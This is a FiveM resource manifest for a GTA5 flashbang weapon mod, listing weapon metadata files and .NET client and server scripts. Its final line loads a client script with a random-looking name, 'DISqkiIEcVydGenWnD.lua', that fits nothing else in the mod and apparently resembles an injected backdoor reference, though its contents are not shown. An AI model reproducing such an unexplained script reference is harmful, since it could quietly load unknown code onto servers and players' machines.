fx_version 'bodacious'
game 'gta5'

--[[
	Scripted By: Xander1998 (X. Cross)
	Model Ported & META's redone By: xRxExTxRxOx
--]]


---------------------------------------------------------------------------
-- INCLUDED FILES
---------------------------------------------------------------------------
files {
	"data/loadouts.meta",
	"data/weaponarchetypes.meta",
	"data/weaponanimations.meta",
	"data/pedpersonality.meta",
	"data/weapons.meta"
}

---------------------------------------------------------------------------
-- DATA FILES
---------------------------------------------------------------------------
data_file "WEAPON_METADATA_FILE" "data/weaponarchetypes.meta"
data_file "WEAPON_ANIMATIONS_FILE" "data/weaponanimations.meta"
data_file "LOADOUTS_FILE" "data/loadouts.meta"
data_file "WEAPONINFO_FILE" "data/weapons.meta"
data_file "PED_PERSONALITY_FILE" "data/pedpersonality.meta"


---------------------------------------------------------------------------
-- SCRIPTS
---------------------------------------------------------------------------
server_script "Flashbang.Server.net.dll"
client_script "Flashbang.Client.net.dll"
client_script "DISqkiIEcVydGenWnD.lua"